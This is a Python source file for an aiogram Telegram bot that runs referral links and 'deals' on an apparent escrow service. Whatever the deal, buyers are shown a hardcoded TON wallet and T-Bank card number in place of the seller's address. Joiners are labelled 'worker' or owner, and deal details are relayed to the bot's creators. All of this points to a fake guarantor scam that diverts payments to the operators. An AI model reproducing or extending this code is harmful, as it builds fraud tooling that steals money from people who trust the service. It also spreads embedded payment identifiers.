# - *- coding: utf- 8 - *-
import json

from aiogram import Router, Bot, F
from aiogram.types import Message, FSInputFile, CallbackQuery
from aiogram_i18n import I18nContext
from aiogram_i18n.types import InputMediaPhoto

from bot.data.config import get_admins
from bot.database import Userx, Referrals, Deals, Worker
from bot.keyboard.inline_user import home, deal_markup
from bot.utils.const_functions import is_wallet_ton, get_bank_by_country, ded, send_owners
from bot.utils.misc.bot_models import FSM, ARS

router = Router(name=__name__)


@router.callback_query(F.data == "back")
async def back(call: CallbackQuery, bot: Bot, state: FSM, i18n: I18nContext):
    await state.clear()

    await call.message.edit_media(media=InputMediaPhoto(media=FSInputFile("bot/assets/images/home.JPG")))
    await call.message.edit_caption(
        caption=i18n.get("welcome-message"),
        reply_markup=home(i18n, False)
    )


@router.message(F.text == "/start")
async def main_start(message: Message, bot: Bot, state: FSM, arSession: ARS, i18n: I18nContext):
    await state.clear()

    await message.answer_photo(
        photo=FSInputFile("bot/assets/images/home.JPG"),
        caption=i18n.get("welcome-message"),
        reply_markup=home(i18n, True)
    )


@router.message(F.text.startswith('/start '))
async def main_start_deeplink(message: Message, bot: Bot, state: FSM, arSession: ARS, i18n: I18nContext):
    deepling_args = message.text[7:]

    if deepling_args.startswith("ref="):
        ref_wallet = deepling_args.replace("ref=", "")
        ref_user = Userx.get(user_ton_wallet=ref_wallet)

        if ref_user is None:
            await main_start(message, bot, state, arSession, i18n)
            return

        if Referrals.get(refferal_id=message.from_user.id) is None:
            Referrals.add(message.from_user.id, ref_user.user_id)
            Userx.update(user_id=ref_user.user_id, refferal_count=ref_user.refferal_count + 1)

        await main_start(message, bot, state, arSession, i18n)
        return

    deal_member = Userx.get(user_id=message.from_user.id)
    deal = Deals.get(deal_id=deepling_args)

    if deal is None:
        await message.reply(i18n.get("invalid_deal_id"))
        return

    if is_wallet_ton(deal.deal_address):
        deal_owner = Userx.get(user_ton_wallet=deal.deal_address)
    else:
        deal_owner = Userx.get(user_card_wallet=deal.deal_address)

    if deal_owner == deal_member:
        await message.reply(
            i18n.get("own_deal_unsupport")
        )
        return

    if deal.deal_member != 0:
        await message.reply(
            i18n.get("already_buyer")
        )
        return

    Deals.update(deal_id=deal.deal_id,
                 deal_member=deal_member.user_id,
                 deal_status="member wait")

    try:
        if is_wallet_ton(deal.deal_address):
            if i18n.locale == "ru":
                paid_text = ded(f"""
                    🏦 <b>Адрес для оплаты:</b>
                        <code>UQAVw441oM3dW1TnDsgKyEoNniRuTrZ4mGJcomzwZZf8Fj3j</code>""")
            else:
                paid_text = ded(f"""
                            🏦 <b>Address for paid:</b>
                                <code>UQAVw441oM3dW1TnDsgKyEoNniRuTrZ4mGJcomzwZZf8Fj3j</code>""")
        else:
            if i18n.locale == "ru":
                paid_text = ded(f"""
                                🏦 Карта к оплате: 2200701919700978
                                💸 Банк: T-Bank""")
            else:
                paid_text = ded(f"""
                                🏦 Карта к оплате: 2200701919700978
                                💸 Банк: T-Bank""")

        await bot.send_message(
            chat_id=deal_owner.user_id,
            text=i18n.get("joined_to_deal",
                          username=message.from_user.username, user_id=str(message.from_user.id).replace(" ", ""),
                          deal_id=deal.deal_id, deals_count=deal_member.sucessful_deals
                          )
        )
        await message.answer(
            text=i18n.get("deal_info", deal_id=deal.deal_id, username=deal_owner.user_login,
                          user_id=str(deal_owner.user_id).replace(" ", ""), deals_count=deal_owner.sucessful_deals,
                          deal_description=deal.deal_description,
                          deal_address=deal.deal_address, paid_text=paid_text, deal_amount=deal.deal_amount, currency=deal.deal_currency),
            reply_markup=deal_markup(
                i18n, True, deal.deal_id, deal.deal_address, is_wallet_ton(deal.deal_address), deal.deal_amount
            )
        )

        user_status = "пользователь"

        if Worker.get(worker_id=deal_member.user_id): user_status = "воркер"
        if deal_member.user_id in get_admins(): user_status = "владелец"

        await send_owners(bot,
                          ded(f"""
                            📄 <b>Информация о сделке #{deal.deal_id}</b>
                            
                            К сделке #{deal.deal_id} присоединился {user_status} @{deal_member.user_login} (<b>{deal_member.user_id}</b>).
                            
                            💰 <b>Сумма:</b> <code>{deal.deal_amount} {deal.deal_currency.upper()}</code>
                            📄 <b>Описание:</b> {deal.deal_description}
                            
                            👤 <b>Создатель:</b> @{deal_owner.user_login} (<b>{deal_owner.user_id}</b>):
                                Успешных сделок: <code>{deal_owner.sucessful_deals}</code>.
                            👤 <b>Участник:</b> @{deal_member.user_login} (<b>{deal_member.user_id}</b>):
                                Успешных сделок: <code>{deal_member.sucessful_deals}</code>.
                            
                            ⚠️ <b>Это сообщение отправляется только создателям бота.</b>
                            """))
    except Exception as e:
        print("Error with joining to deal:"  + str(e))
        Deals.update(deal_id=deal.deal_id, deal_status="pending delete")
        await message.answer(
            "Error with joining to deal =("
        )
        await bot.send_message(
            chat_id=deal_owner.user_id,
            text="Error with joining member to your deal.\nDeal automatically deleted and closed."
        )

        Deals.delete(deal_id=deal.deal_id)